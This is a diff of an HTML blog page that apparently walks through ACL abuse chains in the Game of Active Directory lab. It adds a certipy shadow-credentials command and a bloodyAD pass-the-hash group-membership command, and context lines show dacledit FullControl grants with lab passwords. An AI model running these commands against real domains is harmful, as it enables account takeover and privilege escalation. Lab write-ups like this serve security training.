@@ -235,9 +235,6 @@
 </tr>
 </tbody>
 </table>
-<p>TODO:</p>
-<p>essos.local:
-- ACL</p>
 <h2 id="initial-enumeration">Initial Enumeration</h2>
 <div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.95</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Tue</span><span class="w"> </span><span class="nx">Jan</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nmap</span><span class="o">/</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">iL</span><span class="w"> </span><span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">common</span><span class="o">-</span><span class="nx">port</span><span class="o">-</span><span class="nx">scanning</span><span class="p">.</span><span class="nx">nmap</span>
 <span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.10</span>
@@ -1306,6 +1303,8 @@ nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>
 <div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'joffrey.baratheon'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'joffrey.baratheon'</span>:<span class="s1">'1killerlion'</span>
 </code></pre></div>
 <p><img alt="acl-chain-1-dacl-edit.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-dacl-edit.png"/></p>
+<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>joffrey.baratheon@sevenkingdoms.local<span class="w"> </span>-p<span class="w"> </span>1killerlion<span class="w"> </span>-account<span class="w"> </span>tyron.lannister
+</code></pre></div>
 <p><img alt="acl-chain-1-shadow-credentials.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-shadow-credentials.png"/></p>
 <div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>tyron.lannister.ccache<span class="w"> </span>
 nxc<span class="w"> </span>smb<span class="w"> </span>kingslanding.sevenkingdoms.local<span class="w"> </span>-u<span class="w"> </span>tyron.lannister<span class="w"> </span>-k<span class="w"> </span>--use-kcache
@@ -1316,7 +1315,10 @@ nxc<span class="w"> </span>smb<span class="w"> </span>kingslanding.sevenkingdoms
 <p><img alt="acl-chain-1-dacl-restore.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-1-dacl-restore.png"/></p>
 <h3 id="acl-chain-2">ACL Chain 2</h3>
 <p><img alt="acl-chain-2-path.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-path.png"/></p>
-<p>TODO</p>
+<p><code>b3b3717f7d51b37fb325f7e7d048e998</code></p>
+<div class="highlight"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">"10.1.0.10"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"sevenkingdoms.local"</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">"tyron.lannister"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"aad3b435b51404eeaad3b435b51404ee:b3b3717f7d51b37fb325f7e7d048e998"</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">"Small Council"</span><span class="w"> </span><span class="s2">"tyron.lannister"</span>
+</code></pre></div>
+<p><img alt="acl-chain-2-addself-smallcouncil.png" src="https://ojack69.github.io/jacks-corner/images/ad/goad/acl-chain-2-addself-smallcouncil.png"/></p>
   </div>
   <div class="tag-cloud">
     <p>
